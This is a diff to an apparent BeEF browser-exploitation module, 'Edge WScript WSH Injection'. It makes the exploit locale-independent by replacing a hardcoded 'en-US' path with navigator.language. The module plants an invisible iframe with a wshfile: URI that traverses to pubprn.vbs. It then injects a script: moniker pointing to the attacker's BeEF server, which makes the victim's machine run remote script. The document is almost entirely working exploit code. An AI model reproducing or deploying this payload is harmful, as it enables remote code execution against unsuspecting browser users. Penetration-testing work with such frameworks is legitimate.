@@ -16,7 +16,7 @@ beef.execute(function(){
   try {
     var wsh_iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
     var beef_host = beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port;
-    wsh_iframe_<%= @command_id %>.setAttribute('src', 'wshfile:test/../../../../../../../Windows/System32/Printing_Admin_Scripts/en-US/pubprn.vbs" 127.0.0.1 script:' + beef_host + '/<%= @command_id %>/index.html');
+    wsh_iframe_<%= @command_id %>.setAttribute('src', 'wshfile:test/../../../../../../../Windows/System32/Printing_Admin_Scripts/' + navigator.language + '/pubprn.vbs" 127.0.0.1 script:' + beef_host + '/<%= @command_id %>/index.html');
   } catch (e) {
     beef.debug("[Edge WScript WSH Injection] Could not create iframe");
     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Could not create iframe', beef.are.status_error());
